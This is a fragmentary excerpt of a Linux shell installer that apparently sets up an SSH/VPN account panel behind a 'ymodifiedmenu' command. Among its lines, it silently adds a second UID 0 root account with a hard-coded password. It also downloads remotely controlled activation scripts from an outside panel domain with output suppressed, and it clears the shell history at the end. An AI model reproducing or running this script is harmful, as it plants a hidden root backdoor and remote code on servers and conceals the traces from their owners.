...
useradd -p $(openssl passwd -1 ymodified) ymodified -ou 0 -g 0
...
RESPONSE = 'HTTP/1.1 101 <font color="red">Michaele Abalos</font>\r\n\r\nContent-Length: 104857600000\r\n\r\n'
...
wget -O /root/active.sh "panel-introvertdos.ymodified.net/api/premium/active.php?key=YModified"
sleep 5
wget -O /root/inactive.sh "panel-introvertdos.ymodified.net/premium/inactive.php?key=YModified"
sleep 5
wget -O /root/deleted.sh "panel-introvertdos.ymodified.net/api/premium/deleted.php?key=YModified"
 }&>/dev/null
}
...
echo -e ""
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e " \033[0;31m To Create Account Just Type: ymodifiedmenu\033[0m"
echo -e " \033[0;35m══════════════════════════════════════════════════════════════════\033[0m"
echo -e ""
netstat -tupln
history -c;
